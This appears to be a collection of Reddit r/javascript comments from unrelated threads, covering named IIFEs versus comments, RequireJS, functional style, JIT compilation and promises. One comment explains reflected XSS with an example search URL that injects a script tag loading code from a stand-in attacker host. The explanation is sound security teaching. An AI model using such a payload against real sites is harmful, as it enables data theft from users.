I don't get it. What do you achieve here that isn't sufficed by a comment? Do you just like how a camel-case looks? There is more overhead of creating this function object only for it to be destroyed and never reused.
I used XULRunner and Titanium. XULRunner is somewhat low level and the learning curve is fairly steep. Turning it into a site-specific browser (SSB) isn't very difficult though. Titanium was a lot easier to use. You start with a working example, change some of the things, press a button, and you're done. TideSDK appears to be fairly similar. Since it's a community effort which shows much higher activity than Titanium, I'd rather go with this than Titanium.
More fun with named IIFEs: (function foo (x) { console.log(x); if (x &gt; 0) foo(x-1); })(5);
Its part of "I find this preferable to both" ... [example] ... "and to" ... [other example]. Perhaps it should just be "and". IDK, definitely not an english major ;-)
Ah, my mistake :)
 I avoid comments whenever I can in favor or creating code that is easily understandable by itself. Comments can cause maintainability problems. Imagine this situation Developer A writes this code: // hide Stuff on Instantiaton $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); Developer B adds some stuff // hide Stuff on Instantiaton $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); $('.bar').animate('padding', '200px'); $('#baz').remove(); Developer C goes in and cleans up whitespace // hide Stuff on Instantiaton $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); $('.bar').animate('padding', '200px'); $('#baz').remove(); Developer D adds another line // hide Stuff on Instantiaton $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('#something_else').val('boo'); $('.foo').fadeOut(); $('.bar').animate('padding', '200px'); $('#baz').remove(); I'm sure you can imagine this going on through several edits, with the comment becoming less and less useful.
The camel case is irrelevant. `hide_stuff_on_instantiaton()` is fine. As far as the overhead; yes it may add a microsecond, but I'm willing to accept that if it makes my code more readable and maintainable.
&gt; A separate function can be reused by other parts of the code if you decide so in the future. yes, and turning my code into a reusable function is extremely easy, and in its current form it tells the developer that it *is* only used once. &gt; It can be rewritten to accept arguments, making it more flexible. also, if this were to be useful in the future, there is no difficulty in converting it to such. Using this same logic, you should add jQuery to every website - even if they don't use it yet - since they might in the future? &gt; Moving long sequences of procedural code into separate functions makes code more readable, as long as you use descriptive function names. exactly what I'm suggesting. &gt; A camelCase function name can never be as descriptive as even a single line comment jeeze, guesse r/javascript just doesn't like camel case. I'll edit my example to use underscores I guesse. Not sure why it can't be as descriptive as a comment. I think it can be moreso. The function actually explicity describes what code its related to, as its enclosed in brackets. See my response to idrink211 for more reasons why I sometimes avoid comments.
It's semantically correct but if you have seperation of CSS / JS / HTML files you can drop this in the HTML file &lt;!--We use a script tag since the template tag is not implemented yet --&gt; &lt;script id="thisIsMyTemplate type="text/x-handlebars-template"&gt; &lt;div&gt;{{someData}}&lt;/div&gt; &lt;/script&gt; and it has the same net effect
You didn't like (or agree with) my Developer ABCD maintenance example? I do however agree that reading `(function hide_stuff_on_instantiaton()...` is not quite as nice as `// hide stuff on instantiaton` but heck; we're programmers, we shouldn't be shy about reading code
So many down votes and yet no comments? I'll give you an upvote, dude or ma'am.
I probably wouldn't use it, because I think form should follow function. (no pun intended) That is, code structure should adhere to what you're trying to do, not how you want the code itself to look. That's just me though.
This is what I do, and I'm assuming it's the recommended way given how clean and intuitive it is. Note that the tags use ERB by default though.
(function iWouldnt() { do._this(); })();
Developers B, C and D need a slap on the wrist. You don't just clean up whitespace and you *definitely* don't just add code and leave existing comments outdated. &gt;I avoid comments whenever I can in favor or creating code that is easily understandable by itself. That's definitely best. &gt;Comments can cause maintainability problems. Maintainability problems are more often caused by not having comments than the other way around.
&gt; you definitely don't just add code and leave existing comments outdated. maybe you and I don't; but having worked with other developers, I can tell you it definitely *does* happen. &gt; Maintainability problems are more often caused by not having comments than the other way around. perhaps this is generally true, but can you make that argument for my specific example of (function hide_stuff_on_instantiaton(){ $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); }()); in the developer ABCD example?
try wrapping your sections, and changing the default context, from window to that. 
You're forgetting to factor in the unnecessary extra cognitive overhead caused by having to work out - each and every time you encounter this construction - whether it's "a function that's really a comment" or "a function that *needs* to be an IIFE for some reason". Clean, simple code is preferable to unnecessarily complex, ambiguous code. However, where you start going out of your way (even a little bit) to write unnecessarily complex and inefficient code *just* so you can avoid ever writing "//" or "/* ... */", you're taking it too far. The guideline is "write clean, readable, self-documenting code in preference to shitty-code-plus-reams-of-comments", not "never write a comment under any circumstances, even when it involves unnecessarily obfuscating the code to do it".
Just so we're clear: you're saying you find: function doSomeStuff() { /* some stuff */ (function hideStuffOnInstantiaton(){ $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); }()); /* more stuff */ } *more* readable than: function doSomeStuff() { /* some stuff */ // hide Stuff on Instantiaton $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); /* more stuff */ } and more readable than: function doSomeStuff() { /* some stuff */ hideStuffOnInstantiaton(); /* more stuff */ } function hideStuffOnInstantiaton(){ $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); } 
I do not have the privilege of owning a smartphone. :(
I always do this: (function($){ var init = function(){ hideStuffOnInstantiaton(); otherStuff(); etc(); }; var hideStuffOnInstantiaton = function(){ $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); }; init(); })(jQuery);
Why not use a block? { // hide Stuff on Instantiaton $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); } Or use a comment syntax that says, 'this comment applies from here down to here' // hide Stuff on Instantiaton { $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); // } By not having a function call you gain a tiny bit of speed. Using an IIFE would be useful, however, if you wanted to use a variable in that block but not have it available to anywhere else in the code.
What do you mean? I tried a few things and nothing worked (not great with JS/jquery at all).
Good name, btw.
For Mobile Users If you want to read reddit on your SMARTPHONE: http://redditmobile.blogspot.com.br/ It is a "blog" I've made populated by javascript, it will load images and other stuff in a blog format. You can check the jquery.redditloader github project: https://github.com/melanke/Jquery-RedditLoader
Any idea what percentage of the web using visual browsers does so with JavaScript turned off? Developers have a finite amount of time, and must cater to user groups in descending order of their size...
sorry i figured it out last night at like 5am. forgot to update this. thanks for all the help though 
For one thing, functions are one of the simplest ways of creating abstractions and modularism in your code. They also serve to encourage less pollution of the global namespace, and less shared state that needs to be worried about.
He's very young. He's seen his first favorite coding environment, which he poured his heart and soul into, fail to catch on in the wider community. I feel for him, sure. If that were me, I'd want everyone to be Unix/C programmers. (Don't get me started about "things that have already been solved".) Except, I've spent a career mopping up after these big code-bases filled with all these "solutions". I hold the core technologies that these solutions were trying to "simplify" for me in much higher regard. Technologies like HTTP/REST and JS have been around for years, and I continue to see developers rediscover their greatness. Does he think people will continue to fall in love with Cappuccino ten, twenty years from now? And honestly, the way Google drops things, who's still betting on GWT? I love innovation. I love components I can swap out. My code is an arena for best-of-breed libraries, and that's how I want developers to learn to code. Nah, demand to code. What really are the lessons we've learned after "30 years"? Remember Mac vs. PC? Remember Microsoft/.Net vs. Java? Remember the browser wars? If you missed it, trust me, a splintered industry made up of camps is not a fun one to be in. I like how the Web community has been working lately. I see these variations finding winners. I see standards taking everyone's voice into consideration for once and honestly being adopted. Underscore is nice, then bam, Lo-Dash! Look at WebKit. Look at jQuery. Look at Spring. I, for one, am not done with the Web.
I only program in a functional style. I don't know to explain its benefits except by saying it feels the most natural way to program in this language. I think many people who attempt to learn this language stop far short because they get bogged down with foolish things like learning patterns or frameworks. I have found that from functional programming I tend to be able to write code that does more with few lines of code and much faster than it could otherwise.
I use both. OO is great for describing state but I switch over to a functional style when handling data. It's much better when transforming data between formats. If you've used forEach or map then you've used functional.
I'm sorry but this is less readable, harder to maintain, more prone to bugs/problems, and just worse in every way compared to a comment. Maybe in this case a comment line can be put into a somewhat acceptable function name, but what about when it can't? Any punctuation would make this even harder as you would have to leave it off of the function name, making it even harder to read still.
http://www.reddit.com/r/programming/comments/1y0n9/a_javascript_module_pattern/
Yeah, it might be a valid point, but I actually find myself in that camp. Perhaps I've become spoiled, but now I expect frameworks to stay out of my way and yet continue to offer features as my understanding of it improves and/or my app grows in complexity. jQuery's an excellent example. Slap it into your page and start using its simple functions right away, but as you learn it, it continues to help you write cleaner code with best practices baked in.
IMO, it doesn't really contribute to readability unless you set your IDE's function name color to something striking. It also adds a small amount of overhead (although this is most likely not at all noticeable). You'll also run into scoping issues if you try to declare variables just-in-time (i.e. within the function scope you just created). I like to keep all my function declarations outside of my $(function() {}); body so that NetBeans (or whatever IDE you use) can auto-fold the function bodies, leaving your main logic code very minimal and readable. Cheers. 
This means you only get a horizontal width of 1024px while browsing. That's not very preferred these days. Why do you need it to be on a separate window? Have you considered something that puts it over your current window? If it's simply a tooltip that shows/hides when you mouse over the link, there seems to be no reason to not just show in your current window. If you are looking at the preview there is no need to look at the current page, and vice versa.
the big issue is that most backbone apps will re-render an entire dom structure, mostly because this is the easiest way to get setup, but if there are parts that you can update then it's better to only bind certain elements in the view rather than a whole re-render (http://modernjavascript.blogspot.com/2012/05/how-to-display-collection.html/) That's exactly why I wrote https://github.com/rhysbrettbowen/PlastronJS that I implemented at catch.com, because people can update parts of a model while you are as well. By binding to specific dom elements you can only render changes to a model or a collection rather than the whole thing which would make things really dangerous, as you don't want to tear down the dom when a user is editing it.
good points, though I'm not clear on the scope issue. IMO, in most cases this would alleviate more scope issues than it causes, as the f'n expression would create a new scope, preventing you from accidentally trumping existing vars. Of course, this is compared to just inlining the code, not putting it in a new function declaration, etc..
The [stackoverflow post was answered](http://stackoverflow.com/a/15555071/363701) with the suggestion to use `labels` which actually appears preferable to my suggestion, though perhaps still not terribly useful / accepted? hideStuffOnInstantiaton: { $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); }
yea, you're probably right. the "cognitive overhead" thing is the biggest point against it in my mind. however, my aversion to writing comments is not out of lazyness, but from dealing with legacy code with obsolete, confusing, misplaced, and inconsistant comments. I'll happily take a bit more complexity if it helps prevent code from turning to soup. Might even help raise the bar and scare the interns away ;-)
The creation of a new scope can easily release bugs if your block needs to create a variable that another block needs to use. Also the reasoning that you are adding in more unnecessary code to your project, and the more code you add to anything, the more likely you can make a mistake that you then have to debug, even something as silly as missing a bracket. Another thing I dislike is the essentially forceful requirement of an additional tab break. With a comment you can keep your relevant code in the same tab break, but blocked in separate functionality with a comment. If you are trying to use a pattern like this, you would want to be able to use it throughout an entire project. I would think it would be strange to try to read through a code base that tries to mix of "commenting styles". I don't feel like your method would work in every case, where a comment would always work. Perhaps you just need to focus on both writing better "self commenting code" and using "Loose coupling and high cohesion" in your code. I find that these practices would make this style much less useful and sometimes simply redundant. 
&gt; I like to keep all my function declarations outside of my $(function() {}); body Does that mean you're putting function declarations in the global scope, or are you inside another closure?
Yea, thats mostly where my familiarity with IIFEs came from
good argument against. Thank you for elaborating.
Read John Resig's new book, [Secrets of the Javascript Ninja](http://www.manning.com/resig/). He's pretty clear about javascript already being a functional language. &lt;quote&gt;Implementations of this style of partial function application have existed in other languages, but Oliver Steele was one of the first to demonstrate it with his [Functional.js library](http://osteele.com/sources/javascript/functional/).&lt;/quote&gt; &lt;quote&gt;Traditionally, closures have been a feature of purely functional programming languages. Having them cross over into mainstream development has been particularly encouraging, and it’s not uncommon to find closures permeating JavaScript libraries, along with other advanced code bases, due to their ability to drastically simplify complex operations.&lt;/quote&gt; Is this 2007 again? It's hardly fair to use the phrase, "Introducing Functional JavaScript". Maybe, Introducing "Functional Javascript" (the book). Or something similar. Until this book is out, I highly recommend Resig's book, though. It's awesomeness.
JIT Compilers (V8) will also most likely remove comments (because they don't add to the code) and this will add another pointer overhead so code written in that way will be slower just for the sake of this methodology.
not more readable, no; but *perhaps* more maintainable? IDK, I'm pretty much convinced against doing this now, though I do kinda like it and think there's some merit to it.
excuse my ignorence, but could you explain the JIT Compilers (V8) thing a bit? A lazy 2 minutes of googling and I couldn't even figure out what that is.
Or we could just use comments... Why abuse functionality to obtain an end that we've already achieved? The author of the post mentions that there's no way to know what the comment refers to, but I usually put whitespace between my "thoughts" (in this case, the thought is 'hide some shit'). A comment atop a thought would obviously apply to all of that bit of code: // hide Stuff on Instantiaton $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); some_non_instantiation_func(); vs // hide Stuff on Instantiaton $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); some_non_instantiation_func(); It becomes immediately obvious what the comment refers to. Whitespace and commenting completely satisfy the author's requirements. If you're concerned with the obvious nature of this being changed by another developer after the fact, you could use opening and closing comment tags: // START: hide Stuff on Instantiaton $('oneThing').hide().removeClass(); $('#somethign_else').slideUp(); $('.foo').fadeOut(); // END some_non_instantiation_func(); I would certainly prefer this to a named immediately invoked function. And then he/she calls it a pattern. MVC is a pattern. Controller is a pattern. This is a personal idiom at best, but not a pattern. Not everything is a pattern, so let's stop diluting the term.
Instead of thinking about the advantages of writing functional code, consider the advantages of reading functional code. Take the following procedural code: int sum = 0; for(int i; i&lt;list.length; i++) { sum += list[i]; } I'm sure you can quickly tell what it does, but look at how much it tells you about how it does it. Most of the time you read code you don't care about how stuff is done; you want to know what it does and what the author intended it to do. Functional code, for example using reduce instead of a loop in the above code, tells you a lot about what it does and what it is intended to do, but very little about how it does it. int sum = list.reduce((a, b) =&gt; a + b, 0) Next time you are writing code, estimate how many of the characters on the screen explain the what, and how many explain the how. 
All new browsers use Just In Time (JIT) Compilation of Javascript. I think IE8 and previous IEs did not, but Chrome(V8)/Firefox(IonMonkey)/Safari all pre-compile JavaScript to gain a performance boost instead of interpreting all the code all the time. There's some smartness behind it for code that is eval'ed each time it's run, but for the most part the browsers will load, compile and cache JavaScript now where they didn't before. e: When compiling, they drop comments (because it's not needed for code execution...) so embedding extra immediate functions will cause the compiler to allocate extra memory to store that block of code. It will then have to jump around executing code that's only purpose is to comment.
For your own site it's perfectly fine. Without encoding some characters in the url, the script might just not function correctly, but other than that it is no "security" concern. The worse they could do is mess up the rendering of the page they are viewing. I can do that simply with chrome dev tools or firebug. The security concern in searches like these are on the search page itself. (In this example http://www.adserveraddress.com/). If that page doesn't properly sanitize before inputing what they see in the query string, then they could be prone to an attack. Take for example you had a search box an your site (http://mysite.com) that when someone typed into the box and pressed search, went to something like: (http://mysite.com/search/?q=Cats+and+Dogs). When displaying the search terms on the search page (something like "Your search for "Cats and Dogs" found 1000 results."), a naive implementation would simply print out the search terms on the page. This would be instantly exploitable as: http://mysite.com/search/?q=&lt;script src="http://hacker.hax/myevilscript.js"&gt;&lt;/script&gt; is a valid url. Your search page now would include the script tag as html instead of text, and inject my script into your page. I could redirect or link someone to this url, and with my script steal any user data from your site, or inject malicious code/malware to the user from your site.
If you click through a bunch of tiny links you can get to it eventually.
Tell me if I am wrong, but are they not just describing what the .update() method (or now the .set method in Backbone 1.0) does? You don't need a custom function to update a collection...
Sweet, will do!
I'm no JS expert but a pattern we use in my work which I've found very useful is: var MyLib = { Foo: "hello world", Bar: 101, MyFunction: function(param1, param2) { // anytime you want to reference anything you use its full namespace so to change the value of Bar you would write MyLib.Bar = 17; alert(MyLib.Bar); // would give you 17 // Calling other functions is the same MyLib.MyOtherFunction(); // will alert "hello world" }, MyOtherFunction: function () { alert(MyLib.Foo); } }; The key here is to always remember to a comma separating each function (like at the end of MyFunction but before MyOtherFunction). The namespacing helps structure your code and it means we can get intellisense in Visual Studio. Again, I'm not a JS expert and I'm sure there are some limitations with this and I don't even know what its called but i've been using it over the last few months and found it very helpful. I know this doesn't answer your question but just wanted to pass it on in case it helps somewhere further down the road. jcunews' response seems to have nailed the solution. Good luck dude :)
What benefit could === possibly have in this example over ==?
I just picked up a copy from Softpro books. 
Faster if they are the same type.
thanks!
Not quite. Update and the new fetch behavior relies on getting the entire collection all the time and inferring how the collection has changed. This would not work in the described case because: 1. These collections can have lots of data, as I said in the article, potentially thousands of models - you need to get &amp; apply incremental changes 2. fetch has no way of detecting what has changed and only apply the changes if something has changed. It has to grab all the data, all the time, which is not feasible to do via a periodic AJAX poll
I highly recommend [JavaScript Allongé](http://allong.es/) for the same reason. A truly enlightening read. The author, homoiconic, is a frequent contributor to this subreddit.
From anything I have read since both sides are strings, == will not need to do any casting, and gives the same performance.
In my project, I'm using jquery + [form plugin](http://www.malsup.com/jquery/form/). It works for me for two reasons - I create the forms as regular HTML, so 1) anyone with noscript or javascript turned off can still use them. 2) For anyone with javascript turned on, the form transforms into an ajax form. It can easily support validations (I'm using ASP.Net MVC, so it's baked in)
I have a small observation. If you are going to use a constructor function capitalize the name of it to reduce confusion for other devs. It doesn't change the functionality of anything but it makes the code easier to read.
 var len = cells.length; for (var i = 0; i&lt;len; i+=1) { cells.onclick = function (){ this.style.backgroundColor = "white"; } }
For initial development, I like to keep my functions in global scope or my namespace so I can easily access them through the console for debugging purposes.
You want to populate one select based on another one? There are libraries that help with that. Or you just want to print some values based on the selection? Whatever the case is, making classes for something so so so simple is just an overkill; You should definitely learn that but not for something as simple as this. var fruits = [ { Orange: { name: "orange", color: "whateva", amt: 1 }}, { Apple: { name: "apple", color: "red", amt: 2 }} ] function handleSelect(type) { var selected = fruits[type]; //do whatever like with selected.name / selected.amt) }
JavaScript is inherently OO. I really hope you are not abusing this term to refer to silly things like constructors and pseudo-classes.
I use Faye (the node variant on the backend, ruby also available, but both are accessible via Redis on the server side no matter what language you run) which also has configurable connection strategies.
Wow, really cool! This is taking web workers to the next level. I never thought of using them as anything other than background calculators but this is very inventive. I'm still wrapping my head around the idea ... I especially like the notion of using web workers to namespace things. I know web workers borrow from the Erlang actor model. I've never done anything with Erlang but I guess you can just spawn tons of these actors all over the place and have them talk to each and that's your codebase? Also Erlang lets you do code hot-swapping (which I think is very cool). I wonder if it's possible to do something like that with a fancy web worker library? ... I haven't done much with web workers so my memory is a little hazy about debugging them but it sure would be nice to be able to step through and hot swap code in a running web app without having to refresh the whole thing to see your changes.
hey, glad you like it. Hot swapping is possible: it's demonstrated by the programs at http://grimwire.com/local. (Click the script button on the top right of the app UI, make changes, then hit reload.) The way that example works is by a "reflector" server that lives in the document. It has access to the Environment code and config, so it's able to find the source of the target app and serve it in an interface. The reload request destroys the Web Worker and reloads it with a data URI of the POSTed source, so you'll lose memory state, but the new code will step right into place.
Do you know why everyone loves JQuery? Because it lets you declaratively search things (DOM objects) and chain their transformations (composability). Those are the traits of functional programming. 
`init()` is a function, hence requires calling via parens ().
Upload an example with all the files referenced in your HTML (e.g. don't use a pastebin, use jsfiddle or your own hosting). Just giving the HTML when you're referencing jQuery under ./assets/js/jquery.js and a bunch of other unprovided files means that before we can even attempt to help you we need to download jquery and bootstrap, set up the directories to mimic your structure, and so on. Make it easier for us to help you and you might get some responses :)
The best way, of course, is to avoid PHP serialize() like the plague. There is absolutely no reason to use it in this day and age - JSON is almost always a better solution, and YAML usually fills the gap where it isn't.
Not when you're merely assigning it as a function callback, you don't need (). If you used those, you'd be getting the result of calling the function, which is *not* what you want in this instance.
Try window.onload instead?
As the README.md points out this arose in the context of building a simple test harness for an existing service layer that is communicating using serialized PHP objects. The point isn't that you should or would design a purpose built feature that uses PHP serialize output to communicate data between a server and a web browser. This is a tool that can be used if you find yourself with access to serialized PHP in a javascript context and want to turn it into something that you can manipulate further.
Oh, I read the README - but the idea of using serialized PHP over a REST interface is just plain crazy. ;) Because, you know, using serialize() for *anything* is crazy.
Either do window.onload or put your &lt;script&gt; block after the &lt;canvas&gt; tag (my personal pick)
Oh man, I just had to update some code that I wrote 8 years ago where I took the lazy route and serialized on DB write and unserialized on __construct or an init method automatically called on object creation in my old as fuck self-made framework. So much "what the fuck was I doing" occurred. I can't think of a single time I would use it now. As to this article, I say it's better to rewrite the DB structure and do it correctly than rely on a js library to decrypt. But I can see times where time or budget constraints could prevents that from being possible. It is cool, though, to see how fucking much I've learned over the years. After updating any of my earlier projects I always pity anyone who had to update my code from those days. 
Thanks
Ah ok, I get you. Nice work, makes a lot of sense if dealing with large collections.
I guess underscore is nice and all, but it'd be nice if you'd also mention the builtin capabilities of functional programming in the (rather small) standard library (namely, the [Array](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array) and [Function](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function) objects, and their methods).
 while(true) { ctx.clearRect(0, 0, 200, 200); posY -= 1; ctx.fillRect(posX, posY, 20, 20); } This is no good. Use [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/DOM/window.requestAnimationFrame) for your rendering loop.
I asked a question like this on /r/webdev but didn't get any responses. Nice to see folk doing a similar thing though. I build the widgets and then give users an iframe code so they can embed the widgets. As for user interface? I just have a link on the widget itself saying "Get this widget" which displays a pop up giving you the iframe code. I don't really allow then to generate custom code.
I know there is a reason for all the edge case and gotchas but I hate them as well. I tried flight + bower + amd a few weeks back and although the experience was 'okay' there were still major annoyances. Just imagine what new developers or developers coming to Javascript have to endure. 
This, by Rob Ashton, is related: [Why I stopped using AMD and used Browserify instead](http://codeofrob.com/entries/why-i-stopped-using-amd.html)
Thank you!
Sold!
I've been on the fence regarding using Require.js for a few weeks now -- this helps add some perspective 'from the trenches' and gives me some new options. Thanks!
I recently adopted Require.js for a growing JS project. It was a real headache to get working, but in the end... ...it didn't even work right. No doubt some arcane bit of configuration I hadn't managed to get perfect. I junked the entire thing for a Browserify-based solution, and it just worked, and I don't have to F*CK with it. I really get the feeling that Require.js is an elegant and amazing solution looking for a problem; in the real world Browserify is a much more practical way of getting working code developed and out the door. (Then again, Require.js is really popular, and I guess all those people probably aren't all wrong. But it certainly doesn't solve *my* problems very well.)
doesn't seem to work; chrome
Rather than assigning the callback directly to the onload method, you can attach it as an event using addEventListener. document.addEventListener("DOMContentLoaded", init, false); This allows you to attach more methods to the same event rather than have to manually collect them all into a parent function that gets assigned to the onload method.
I really like RequireJS, haven't had any problems with it.
I use this pattern in two places; constructors and tests. For example: function Person(firstname, lastname, age){ this.firstname = firstname; this.lastname = lastname; this.age = age; (function init(){ this.fullname = firstname + " " + lastname; })(); } And in Jasmine tests: describe("this is a test", function(){ var something; beforeEach(function(){ //setting up the world for the test (function because(){ something = 5; })(); }); it("should be five", function(){ expect(something).toBe(5); }); }); But I like the comment about using a label instead of a named IIFE, since it doesn't actually have to be a function. I agree with his concern that comments tend to drift away from the code they describe, but a label with a wrapping curly brace pair won't drift away. 
are you using any openly available tools? please share
Ah, that makes sense :) 
Well, I maintain the JS [porter stemmer](https://github.com/kristopolous/Porter-Stemmer), I have a [document store](https://github.com/kristopolous/db.js), a [debugger](https://github.com/kristopolous/_inject), some [youtube browser](https://github.com/kristopolous/ytmix) (and a [music video site](https://github.com/kristopolous/emptyv)), my own [simple solution for this problem](https://github.com/kristopolous/EvDa), even an [inline json interpreter in bash](https://github.com/kristopolous/TickTick). For private firms I've done things like socket.io (a few years before socket.io), an mvc js framework in 2008, and many other things. I'm also a frequent submitter to the JS1k competitions. So javascript isn't a "new" thing for me.
I had a few problems as well. Sometimes refreshing the page would fix the problem, and once I just did the step after the stuck one, and it seemed to correct itself.
I had to wrestle with Require.js for months before I figured out all of the edge cases. It is not intuitive. I wondered if I had regretted the choice, as the devs on our team were complaining about it. I looked further, and found out one of the core people who built require was also a core member of the Dojo team, another project that locked me into counter-intuitive and quirky development several years ago. Seems these people are into over-engineering.
Well for one it makes writing code with dependencies easier to use on the server-side. Asynchronous loading is also nice. I've also found that breaking up my code into modules helps keep things organized, more so than just a bunch of &lt;script&gt; tags.
To paraphrase ... when you use RequireJS, you end up with 2 problems. 
Are you referring to Require or to AMD/Modular dev in general? How do you deal with conflicting variable names? Dependencies on large projects? Run-time dependencies? Multiple versions of the same library? packaging your code into a single compact file? 
closures and `/bin/cat`. It's built-in. Elegant and implicit &gt; clunky and explicit.
Very cool, and inspiring! Wondering what kind of wizardry I could put this idea to use for.
I just refactored a project to require and it was a pain. The project was on the medium-small size - around 75 scripts that were already modularized but without dependency/require boilerplate. We have a lot of deep models and views so the dependencies were hard to setup and then it got worse when we ran into circular dependency hell (CDH). CDH is a problem in AMD/require and they try to shake it off like it's your project's/architecture's fault. Circular dependencies are not uncommon in large projects. There are workarounds in require that force you to write your modules in commonjs format, or they suggest other hacks in your architecture. Ironically, I would only recommend require/AMD for small apps or big apps without a lot of depth. 
well done Pai
I've yet to use RequireJS, but I can appreciate your sentiment. Interested to see where the debate will go. Anyone have anything to add to this? Thoughts on CDH?
Will do. :-)
"Programming without Classes" This book sounds like a nightmare
Conflicting variable names and multiple versions are overrated arguments and I've never had a problem with that (or rarely used it) in production or on my large team.
Nice. This would make a great animated desktop. Does it depend on WebGL or esoteric CSS? It doesn't work in Firefox 19 or IE 9, only Chrome. More accurately, in IE9 it animates squares instead of trapezoidal cube faces.
I made it; hadn't done anything in javascript for AGES, and due to a side project I noted that most solutions for doing exactly this (loading PO files and using them) sucked. Hard. Either by forcing me to use some converter on the PO files I already had to extract, or by incorrectly parsing the files, or for other reasons (weird APIs, whatever) so I made mine. At some point in the future I plan to incorporate binary .mo files parsing (I've already got a couple ideas on how to pull that off), but meanwhile, gzipped .po files are actually smaller than any .mo files I can generate, so I'm going to be using those. Would you change anything? Add stuff? Remove stuff? 
Am I the only one who read this as "porno.js"?
Yeah, require-text is great for templates. 
An awesome game where little entities are trying to fuck you up!
What are PO/MO files?
you might be experiencing keming issues.
Why should it redirect to r/ecmascript? JavaScript is just an ECMAScript dialect with some additional components like the DOM or HTML5 APIs like web storage. I think using /r/javascript is being more accurate than /r/ecmascript for most of the content posted here.
JavaScript is a subset of ECMAScript (or the other way around depending on how you look at it), I'd like to have separate subreddits for them as JS often includes discussion of DOM-centric stuff, which ECMAScript doesn't, and shouldn't, care about.
Ah, I see. So, document.createElement() isn't necessarily appropriate on /r/ecmascript ? The lines seem a bit blurred.
Yeah, that's exactly what I found. It's just so fiddly. (Also, the docs are simply *atrocious* if you're new and trying to figure it out. And I never did find a good tutorial; everything seemed oriented at experts looking for a reminder. And given how fiddly the configuration syntax is, I can see why experts would need reminders, but it made like hard on me as a newbie trying to learn it.)
`window.onload` rather than `document.onload` is the callback you're looking for. As a side note, the `moveDown` function does not declare the variables `posX` and `posY` (using var). So these will become global variables. As a side effect, posX and posY in `init()` are declared (with `var`) and so they will not reference the global variables. This means that `posX` in `init()` is a completely different variables than the `posX` in `moveDown`.
&gt; It's just obvious that you've never worked in an environment with 20+ developers all with their own styles Yep. We have 4-6 devs working on all layers of the app, and own styles are frowned upon, but having Require to manage the JavaScript code is miles ahead of not having anything. Require is fiddly and not always obvious how to set it up. The article claims that browserify solves the same problems better, and that's up for debate, but the existence of the problems of managing large codebases is not up for debate. JavaScript is not special in this regard. Seriously, if you can't write a [single-responsibility](http://en.wikipedia.org/wiki/Single_responsibility_principle) class(or [module](http://blog.davidlitmark.com/post/6009004931/an-introduction-to-the-revealing-module-pattern) in JavaScript) and put it under [test](http://chaijs.com/), then you cannot join a competent, professional team. The need is to keep the codebase working and evolving in the long term. That holds in JavaScript, as it holds in any language. Reading though kristopolous' related comments, it seems that they might have ways around this problem rather than just not knowing about it. By all means; make something better than require and the JavaScript world will thank you. 
you have 2 different variables called `multiplied`. The first is defined in the global scope. Then, each time you call the function `timesTwo`, you create a *new* variable of the same name, but in the local scope. You then promptly throw it away after returning, never actually modifying the global `multiplied` var multiplied = 5; function timesTwo(number){ multiplied = number * 2; } timesTwo(4); console.log(multiplied) // prints '8' the key difference being the use of the `var` keyword using `var` creates a new variable of that name in the current scope.
Your code formatting is allll messed up. Example: https://raw.github.com/victoralex/gameleon/master/daemons/daemon.achievementServer.js
I like how we get downvoted for pointing this out.
Yah, i fixed it shortly after this post, i now know there are a whole bunch of errors there
Ok, ill try that to
&gt;promises are also wonderfully composable, something that the other mechanisms aren't really. Totally agree. Promises are both portable, and interoperable. So, if one particular promise implementation adheres to the spec (like, say [Q](https://github.com/kriskowal/q)), it can be chained together with promises from a totally different library. It's like magic. That was the main motivation for making [FF](http://github.com/gameclosure/ff) work as both sequential flow control (ala [Step](https://github.com/creationix/step) or [async](https://github.com/caolan/async)), and as a promise library.
Take a gander at [knockoutjs](http://knockoutjs.com/) - it's made my life a lot easier with form processing/manipulation and saving/loading. You will need to look into bindings to combine knockout with plugins like inputmask/jqueyUI but it's very easy to do.
I'm working on some promises/futures additions to Objective-C, and this is giving me some really cool ideas for where to go next. Thanks, OP.
I think step had 2 major issues. Firstly, it did absolutely evil miserable horrible things with the _this_ object. I wanted to strangle the developer with his own intestines at one point because of those issues. Secondly, the fact that he dropped the errors down onto the next callback, instead of exiting out and calling the error library. This meant that if you mucked up 1 error check in the code, you ended up with a huge fuck up. It also significantly increased the boilerplate that you had to write. I'll be honest, in that I am not sure I like the way FF does it much better. It requires you to break out of the function's scope, which is actually something I try to avoid. This is the FF example you had there : : var f = ff(this, function () { fs.readFile("1.txt", f.slot()); fs.readFile("2.txt", f.slot()); }, function (fileA, fileB) { this.sortFileContents(fileA, fileB, f.slot()); }, function (result) { f.pass(result.toUpperCase()); } ).onComplete(nextFn); In the following way with async. (this is from memory, so don't hate me if it is wrong =) async.waterfall([ function(next) { async.parallel([ async.apply(fs.readFile, '1.txt'), async.apply(fs.readFile, '2.txt') ], next); }, _.bind(this.sortFileContents, this) // assuming the signature matches ], nextFn); What I like about how async works, is it works very directly with node style callback passing.so you are free to re-use any of the functions directly, or use partial application to make sure the right args are populated. I did some experiments a while back expanding on the last point some time ago. [check the comments on this gist](https://gist.github.com/Vertice/1629491). If I do need to have a promise, i would add a function around it with this : var defer = $.Deferred(); // i use jquery most often. sue me. function nextFn(err, results) { if (err) return defer.reject(err); defer.resolve(results); } // async code here return defer.Promise(); 
